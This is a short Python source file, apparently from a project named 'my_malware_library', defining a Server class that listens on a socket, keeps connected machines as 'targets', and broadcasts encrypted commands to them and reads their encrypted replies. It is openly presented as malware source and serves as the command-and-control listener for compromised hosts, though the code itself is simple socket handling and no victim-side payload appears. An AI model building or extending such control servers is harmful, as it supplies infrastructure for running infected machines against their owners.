# my_malware_library/core/server.py
import socket
import threading
from ..core.encryption import encrypt, decrypt

class Server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.targets = []
        self.ips = []
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((ip, port))
        self.sock.listen()

    def accept_connections(self):
        while True:
            target, ip = self.sock.accept()
            self.targets.append(target)
            self.ips.append(ip)
            print(f"New connection from {ip}")

    def send_to_all(self, data):
        for target in self.targets:
            encrypted_data = encrypt(data)
            target.send(encrypted_data.encode())

    def receive(self, target):
        encrypted_data = target.recv(1024).decode()
        return decrypt(encrypted_data)